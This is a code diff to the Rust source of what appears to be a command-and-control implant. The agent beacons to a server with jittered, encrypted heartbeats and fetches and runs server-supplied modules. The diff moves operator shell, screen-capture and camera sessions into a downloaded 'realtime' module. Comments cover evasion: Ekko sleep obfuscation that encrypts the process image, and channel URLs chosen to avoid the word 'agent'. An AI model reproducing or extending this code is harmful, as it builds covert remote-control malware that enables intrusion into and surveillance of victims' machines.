@@ -1,26 +1,19 @@
 use serde_json::Value;
 
-use libra_common::protocol::WebSocketMessage;
 use libra_crypto::AgentCrypto;
 use libra_comm::http::HttpCommunicator;
-use libra_comm::ws::{WsCommunicator, WsSender, send_msg_via};
 
 use crate::config::ConfigManager;
 use crate::engine::heartbeat::{heartbeat_tick, jittered_interval};
-use crate::engine::shell::ShellSession;
+use crate::module_manager::{ModuleManager, run_module};
 
-mod dispatcher;
 mod heartbeat;
-mod shell;
-mod streams;
 mod utils;
 
 pub struct AgentEngine {
     config: ConfigManager,
     crypto: AgentCrypto,
     http: Option<HttpCommunicator>,
-    ws: Option<WsCommunicator>,
-    ws_tx: Option<WsSender>,
     agent_id: String,
     /// Per-session channel token issued at registration (rotates per session).
     session_token: String,
@@ -31,28 +24,12 @@ pub struct AgentEngine {
     result_path: String,
 }
 
-/// Shared, thread-safe state that concurrent WS message handlers need.
-/// One instance lives for the whole agent run; every inbound message is
-/// dispatched as its own task against it, so a long-running task (module
-/// execution, network collection, …) never blocks the receive loop.
-pub(crate) struct EngineShared {
-    pub agent_id: String,
-    pub shell_session: tokio::sync::Mutex<Option<ShellSession>>,
-    pub screen_session: std::sync::Mutex<Option<tokio::sync::watch::Sender<bool>>>,
-    pub camera_session: std::sync::Mutex<Option<std::sync::Arc<std::sync::atomic::AtomicBool>>>,
-    /// 串行化「消息处理」与「混淆 sleep」：Ekko 会加密整个镜像，混淆 sleep
-    /// 期间任何执行模块代码的任务都必须等待，否则会踩到密文崩溃。
-    pub process_gate: tokio::sync::Mutex<()>,
-}
-
 impl AgentEngine {
     pub fn new(config: ConfigManager) -> Self {
         Self {
             config,
             crypto: AgentCrypto::new(),
             http: None,
-            ws: None,
-            ws_tx: None,
             agent_id: String::new(),
             session_token: String::new(),
             profile: None,
@@ -75,8 +52,6 @@ impl AgentEngine {
                 Err(e) if e == "SESSION_LOST" => {
                     libra_common::dlog!("[INFO] session lost — re-registering");
                     self.http = None;
-                    self.ws = None;
-                    self.ws_tx = None;
                     self.session_token.clear();
                     self.profile = None;
                     continue;
@@ -160,31 +135,17 @@ impl AgentEngine {
         self.agent_id = agent_id;
         self.http = Some(http);
 
-        // WS 按需：构造通信器但**不自动连接**。只有服务端心跳响应带
-        // wsNeeded=true（操作员打开 shell/屏幕/摄像头）时才建立连接。
-        let mut ws = WsCommunicator::new(&self.config.ws_url(), &self.agent_id);
-        if let Some(key) = self.crypto.session_key() {
-            ws.set_session_key(key);
-        }
-        self.ws = Some(ws);
-
         self.main_loop().await
     }
 
-    // ── Main event loop（WS 按需）───────────────────────────────────
+    // ── Main event loop（本体零 WS：wsNeeded 只驱动 realtime 模块）────
 
     async fn main_loop(&mut self) -> Result<(), String> {
-        let mut ws = self.ws.take().ok_or("WS not initialized")?;
-        // WsSender 的 write 端为 Arc 共享：连接建立后自动生效，未连接时静默丢弃。
-        let tx = ws.sender();
         let _http = self.http.as_ref().ok_or("HTTP not initialized")?;
         let agent_id = self.agent_id.clone();
         let server_url = self.config.server_url.clone();
-        // 单入口模式：所有 beacon 流量走同一入口路径（注册前为 register_path，
-        // 注册后 HttpCommunicator 已切换为 profile.entry_path）。
         let register_path = self.config.register_path.clone();
 
-        let (shell_tx, mut shell_rx) = tokio::sync::mpsc::unbounded_channel::<WebSocketMessage>();
         let hb_key = self.crypto.session_key();
         let hb_interval_ms = self.config.heartbeat_interval_ms;
         let hb_jitter = self.config.jitter_percent;
@@ -192,32 +153,17 @@ impl AgentEngine {
         let profile = self.profile.clone();
 
         // Cloud module manager — downloads modules on demand (shared with the
-        // heartbeat task that executes one-shot tasks). 单入口：路径参数用
-        // register_path（communicator 已切换到 profile.entry_path）。
+        // heartbeat task that executes one-shot tasks).
         let module_manager = std::sync::Arc::new(tokio::sync::Mutex::new(
-            crate::module_manager::ModuleManager::new(
+            ModuleManager::new(
                 &server_url, &register_path, &register_path, &register_path,
                 agent_id.clone(), hb_key, Some(session_token.clone()),
             ),
         ));
 
-        // Shared state for concurrent handlers.
-        let shared = std::sync::Arc::new(EngineShared {
-            agent_id: agent_id.clone(),
-            shell_session: tokio::sync::Mutex::new(None),
-            screen_session: std::sync::Mutex::new(None),
-            camera_session: std::sync::Mutex::new(None),
-            process_gate: tokio::sync::Mutex::new(()),
-        });
-
-        // WS 按需命令通道：true = 服务端要求建立 WS；false = 释放。
+        // WS 需求命令通道：true = 服务端要求实时通道（启动 realtime 模块）；
+        // false = 释放（停止模块）。
         let (ws_cmd_tx, mut ws_cmd_rx) = tokio::sync::mpsc::unbounded_channel::<bool>();
-
-        // WS 客户端 Ping 保活（15s）：中间设备空闲超时会掐断无流量长连接。
-        // 必须用 interval（循环外创建），select 里临时 sleep 会被每轮重置。
-        let mut ws_ping = tokio::time::interval(std::time::Duration::from_secs(15));
-        ws_ping.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
-        ws_ping.tick().await; // 消耗首个立即完成的 tick
 
         // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
         // with the session key, with per-tick jitter. Signals a re-register if
@@ -226,16 +172,21 @@ impl AgentEngine {
         let hb_mm = module_manager.clone();
         let hb_reconnect = reconnect_tx.clone();
         let hb_ws_cmd = ws_cmd_tx.clone();
+        // 主循环（realtime 模块管理）仍要使用这些值：spawn 前各留一份副本
+        let hb_agent_id = agent_id.clone();
+        let hb_server_url = server_url.clone();
+        let hb_register_path = register_path.clone();
+        let hb_session_token = session_token.clone();
         tokio::spawn(async move {
-            let mut hb_http = HttpCommunicator::new(&server_url, &register_path, &register_path, &register_path);
-            if !session_token.is_empty() {
-                hb_http.set_session_token(session_token);
+            let mut hb_http = HttpCommunicator::new(&hb_server_url, &hb_register_path, &hb_register_path, &hb_register_path);
+            if !hb_session_token.is_empty() {
+                hb_http.set_session_token(hb_session_token);
             }
             if let Some(p) = profile {
                 hb_http.set_profile(p);
             }
             loop {
-                match heartbeat_tick(&hb_http, &agent_id, hb_key.as_ref(), &hb_mm).await {
+                match heartbeat_tick(&hb_http, &hb_agent_id, hb_key.as_ref(), &hb_mm).await {
                     Ok(ws_needed) => {
                         // 每个心跳都同步一次 WS 需求（幂等，服务端状态为准）
                         let _ = hb_ws_cmd.send(ws_needed);
@@ -248,136 +199,62 @@ impl AgentEngine {
                     _ => {}
                 }
 
-                // beacon sleep：块状抖动。
-                //
-                // ⚠️ Ekko 混淆 sleep（libra_syscalls::obfuscated_sleep）已被移出主路径：
-                // 它加密整个镜像期间，tokio 多线程 runtime 的 IO 驱动/调度器/其他
-                // worker 线程仍在执行 agent 的 .text（已被加密）→ 执行垃圾指令 →
-                // 栈损坏/stack overflow 崩溃（WS 连接建立后 IO 活跃，必现）。
-                // process_gate 只能挡住业务任务，挡不住 tokio 内部线程。
-                // 要安全启用需：单线程进程 + 加密前挂起所有其他线程（隔离 VM 验证）。
+                // beacon sleep：块状抖动（普通 sleep，无镜像混淆）。
                 let interval_ms = jittered_interval(hb_interval_ms, hb_jitter);
                 tokio::time::sleep(std::time::Duration::from_millis(interval_ms)).await;
             }
         });
 
-        // ── WS 按需状态机 ──
-        // 未连接：等待 wsNeeded=true（或重注册信号），收到后建立连接。
-        // 已连接：处理 WS 消息 / shell 输出转发 / wsNeeded=false 断开 / 断线自愈
-        // （断线后回到未连接态，下个心跳若仍需要则自动重连）。
-        let mut ws_connected = false;
-        let mut do_reconnect = false;
+        // ── 主循环：realtime 模块生命周期管理 ──
+        // wsNeeded=true → 下载并启动 realtime 模块（模块自建 WS 接管所有
+        // WS 消息处理）；wsNeeded=false → 停止模块。幂等 + 状态跟踪，
+        // 避免每个心跳重复调用。
+        let mut realtime_started = false;
+        let ws_url = self.ws_url_for(&agent_id);
+        let session_key_b64 = hb_key.map(|k| {
+            use base64::Engine as _;
+            base64::engine::general_purpose::STANDARD.encode(k)
+        });
 
         loop {
-            if do_reconnect {
-                break;
-            }
-
-            if !ws_connected {
-                tokio::select! {
-                    _ = reconnect_rx.recv() => {
-                        libra_common::dlog!("[INFO] re-registering with server");
-                        do_reconnect = true;
-                    }
-                    Some(need) = ws_cmd_rx.recv() => {
-                        if need {
-                            for i in 0..3 {
-                                if ws.connect().await.is_ok() {
-                                    ws_connected = true;
-                                    self.ws_tx = Some(tx.clone());
-                                    break;
-                                }
-                                if i < 2 {
-                                    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
-                                }
-                            }
-                            // 失败：保持未连接，下个心跳会再次同步需求
-                        }
-                    }
+            tokio::select! {
+                _ = reconnect_rx.recv() => {
+                    libra_common::dlog!("[INFO] re-registering with server");
+                    return Err("SESSION_LOST".into());
                 }
-                continue;
-            }
-
-            // WS 已连接：空闲时短暂让出处理锁，让心跳任务有机会进入 Ekko 混淆 sleep。
-            match shared.process_gate.try_lock() {
-                Ok(_gate) => {
-                    tokio::select! {
-                        _ = reconnect_rx.recv() => {
-                            libra_common::dlog!("[INFO] re-registering with server");
-                            do_reconnect = true;
-                        }
-
-                        Some(need) = ws_cmd_rx.recv() => {
-                            if !need {
-                                libra_common::dlog!("[INFO] ws release — closing channel");
-                                ws.close().await;
-                                ws_connected = false;
-                            }
-                        }
-
-                        _ = ws_ping.tick() => {
-                            // 保活：协议级 Ping（服务端/中间设备自动回 Pong）
-                            tx.send_ping().await;
-                        }
-
-                        Some(msg) = shell_rx.recv() => {
-                            libra_common::dlog!("[SEND] {} | rid={} | data={}",
-                                msg.msg_type,
-                                msg.request_id.as_deref().unwrap_or("-"),
-                                msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
-                            );
-                            send_msg_via(&tx, &msg).await;
-                        }
-
-                        result = tokio::time::timeout(std::time::Duration::from_millis(50), ws.receive()) => {
-                            match result {
-                                Ok(Some(msg)) => {
-                                    libra_common::dlog!("[RECV] {} | rid={} | data={}",
-                                        msg.msg_type,
-                                        msg.request_id.as_deref().unwrap_or("-"),
-                                        msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
-                                    );
-                                    // Dispatch each inbound message as its own task so a
-                                    // long-running handler (module execution, network
-                                    // collection, …) does not block receiving or handling
-                                    // further messages.
-                                    let s = shared.clone();
-                                    let msg_tx = tx.clone();
-                                    let msg_shell_tx = shell_tx.clone();
-                                    let mm = module_manager.clone();
-                                    tokio::spawn(async move {
-                                        // 等混淆 sleep 结束再执行模块代码
-                                        let _g = s.process_gate.lock().await;
-                                        crate::engine::dispatcher::dispatch(
-                                            &s, &msg_tx, &msg_shell_tx, &mm, msg,
-                                        ).await;
-                                    });
-                                }
-                                Ok(None) => {
-                                    // 断线：回到未连接态，下个心跳若仍需 WS 则自动重连
-                                    libra_common::dlog!("[WARN] WebSocket disconnected");
-                                    ws.close().await;
-                                    ws_connected = false;
-                                }
-                                Err(_) => {
-                                    // 50ms 内无消息：释放锁，给心跳混淆 sleep 机会
-                                }
-                            }
-                        }
+                Some(need) = ws_cmd_rx.recv() => {
+                    if need && !realtime_started {
+                        let input = serde_json::json!({
+                            "action": "start",
+                            "wsUrl": ws_url,
+                            "agentId": agent_id,
+                            "sessionKey": session_key_b64.clone().unwrap_or_default(),
+                            "sessionToken": session_token,
+                            "serverUrl": server_url,
+                            "registerPath": register_path,
+                        });
+                        let r = run_module(&module_manager, "realtime", input).await;
+                        libra_common::dlog!("[realtime] start: {}", r);
+                        realtime_started = r.contains("\"status\"");
+                    } else if !need && realtime_started {
+                        let r = run_module(&module_manager, "realtime",
+                            serde_json::json!({ "action": "stop" })).await;
+                        libra_common::dlog!("[realtime] stop: {}", r);
+                        realtime_started = false;
                     }
-                }
-                Err(_) => {
-                    // 心跳在混淆 sleep，短暂让出后重试
-                    tokio::time::sleep(std::time::Duration::from_millis(20)).await;
                 }
             }
         }
+    }
 
-        // Put ws back before returning
-        self.ws = Some(ws);
-        // 此处只可能是重注册信号（SESSION_LOST）触发的 break：
-        // heartbeat 检测到会话丢失 → reconnect_rx → do_reconnect。
-        // 返回 SESSION_LOST 让 run() 重新走注册流程。
-        Err("SESSION_LOST".into())
+    /// 实时通道 URL（/ws/realtime?channel=，无 agent 字样）。
+    fn ws_url_for(&self, agent_id: &str) -> String {
+        let (scheme, rest) = if self.config.server_url.starts_with("https://") {
+            ("wss://", &self.config.server_url[8..])
+        } else {
+            ("ws://", &self.config.server_url[7..])
+        };
+        let host = rest.trim_end_matches('/');
+        format!("{}{}/ws/realtime?channel={}", scheme, host, agent_id)
     }
 }
